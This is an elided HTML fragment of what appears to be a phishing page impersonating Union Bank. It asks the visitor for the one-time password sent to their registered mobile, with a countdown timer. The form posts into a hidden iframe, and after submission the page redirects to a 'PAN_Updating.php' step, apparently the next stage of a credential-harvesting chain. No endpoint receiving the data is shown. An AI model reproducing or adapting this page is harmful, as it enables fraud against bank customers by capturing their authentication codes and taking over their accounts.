...
<body onload="startTimer();">
    ...
    <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='PAN_Updating.php';}"></iframe>
    <!--My Form-->
    ...
    which was sent to your registered mobile <br>number with Union Bank.</b></center><br>
        ...
        padding:0px 25px; font-size:16px;"><i>One Time Password*</i> </b><br>
            <div id="dd">
                <input type="text" name="Login OTP" id="ee" inputmode="numeric" placeholder="OTP" maxlength="6" pattern="[0-9]{6}" title="Please Enter Valid One Time Password" required=""><br>
                <script type="text/javascript">
                    var timer = 180;
                    var sec = 0;
        ...
        <div>
            <img src="lasst.png" alt="" id="ft"><br><br>
